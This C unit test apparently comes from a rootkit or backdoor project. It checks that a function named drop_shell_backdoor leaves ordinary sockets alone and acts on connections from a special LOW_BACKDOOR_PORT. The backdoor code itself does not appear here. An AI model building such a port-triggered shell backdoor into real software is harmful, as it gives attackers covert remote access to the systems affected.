#include <sys/socket.h> /* struct sockarrd */
#include <string.h> /* memset() */
#include <arpa/inet.h> /* htons */
#include "beurk.h" /* all tested functions */
#include "config.h" /* all literals */
#include "tests.h" /* assert_true() */

void    test_drop_shell_backdoor(unsigned int *count, unsigned int *total) {
    struct sockaddr_in addr;

    memset(&addr, 0, sizeof(addr));

    /* if a fresh sockaddr is passed, the function must return
     * the socket passed as first argument
     */
    *count += assert_true(drop_shell_backdoor(99, (struct sockaddr*)&addr) == 99,
            ++(*total), "drop_shell_backdoor(99, misc-sockaddr) == 99");

    /* if LOW_BACKDOOR_PORT is the sin_port, the function must return
     * close_socket(), aka -1
     */
    addr.sin_port = htons(LOW_BACKDOOR_PORT);
    *count += assert_true(drop_shell_backdoor(99, (struct sockaddr*)&addr) == -1,
            ++(*total), "drop_shell_backdoor(99, backdoor-port-sockaddr) == -1");
}
